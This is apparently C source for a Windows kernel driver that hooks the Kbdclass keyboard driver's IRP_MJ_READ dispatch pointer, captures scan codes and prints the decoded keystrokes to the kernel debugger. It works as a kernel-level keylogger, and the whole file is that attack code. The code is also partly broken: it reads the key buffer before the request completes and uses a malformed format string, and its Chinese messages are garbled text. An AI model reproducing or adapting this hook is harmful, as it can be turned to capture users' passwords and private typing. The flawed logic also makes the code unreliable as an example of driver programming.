#include "Common.h"

//global
PDRIVER_DISPATCH	OrigReadDispatchFun;
PDRIVER_OBJECT		KbdDriverObject;


// flags for keyboard status
#define	S_SHIFT				1
#define	S_CAPS				2
#define	S_NUM				4
static int kb_status = S_NUM;
void __stdcall print_keystroke(UCHAR sch)
{
	UCHAR	ch = 0;
	int		off = 0;

	if ((sch & 0x80) == 0)	//make
	{
		if ((sch < 0x47) ||
			((sch >= 0x47 && sch < 0x54) && (kb_status & S_NUM))) // Num Lock
		{
			ch = asciiTbl[off + sch];
		}

		switch (sch)
		{
		case 0x3A:
			kb_status ^= S_CAPS;
			break;

		case 0x2A:
		case 0x36:
			kb_status |= S_SHIFT;
			break;

		case 0x45:
			kb_status ^= S_NUM;
		}
	}
	else		//break
	{
		if (sch == 0xAA || sch == 0xB6)
			kb_status &= ~S_SHIFT;
	}

	if (ch >= 0x20 && ch < 0x7F)
	{
		KdPrint(("%C /n", ch));
	}

}

NTSTATUS MyDispatchRead(
	_In_ struct _DEVICE_OBJECT *DeviceObject,
	_Inout_ struct _IRP *Irp
)
{
	PKEYBOARD_INPUT_DATA KeyData;
	KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
	if (NT_SUCCESS(Irp->IoStatus.Status))
	{
		KdPrint(("É¨ÃèÂë£º%x", KeyData->MakeCode));
		KdPrint(("¼üÅÌ £º%s", KeyData->Flags ? "µ¯Æð" : "°´ÏÂ"));
		print_keystroke((UCHAR)KeyData->MakeCode);
	}
	if (Irp->PendingReturned)
	{
		IoMarkIrpPending(Irp);
	}
	return OrigReadDispatchFun(DeviceObject, Irp);
}

NTSTATUS FsdHookKeyBoard()
{
	NTSTATUS			Status = STATUS_SUCCESS;
	UNICODE_STRING		usKbdName;
	RtlInitUnicodeString(&usKbdName, L"\\Driver\\Kbdclass");
	Status = ObReferenceObjectByName(&usKbdName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		0,
		*IoDriverObjectType,
		KernelMode,
		NULL,
		(PVOID*)&KbdDriverObject);
	if (!NT_SUCCESS(Status))
	{
		KdPrint(("ObReferenceObjectByName £¡"));
		return Status;
	}
	else
	{
		ObDereferenceObject(KbdDriverObject);
	}
	OrigReadDispatchFun = KbdDriverObject->MajorFunction[IRP_MJ_READ];
	KbdDriverObject->MajorFunction[IRP_MJ_READ] = MyDispatchRead;
	return Status;
}

//Ð¶ÔØÀý³Ì
VOID DriverUnload(IN PDRIVER_OBJECT pDriverObject)
{
	if (KbdDriverObject!=NULL)
	{
		KbdDriverObject->MajorFunction[IRP_MJ_READ] = OrigReadDispatchFun;
	}
	KdPrint(("Çý¶¯Ð¶ÔØ³É¹¦£¡"));
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	NTSTATUS Status;
	KdPrint(("Çý¶¯¼ÓÔØ³É¹¦£¡"));
	Status = FsdHookKeyBoard();
	if (NT_SUCCESS(Status))
	{
		KdPrint(("FSDHOOK¼üÅÌ³É¹¦£¡"));
	}
	else
	{
		KdPrint(("FSDHOOK¼üÅÌÊ§°Ü£¡"));
	}
	pDriverObject->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
}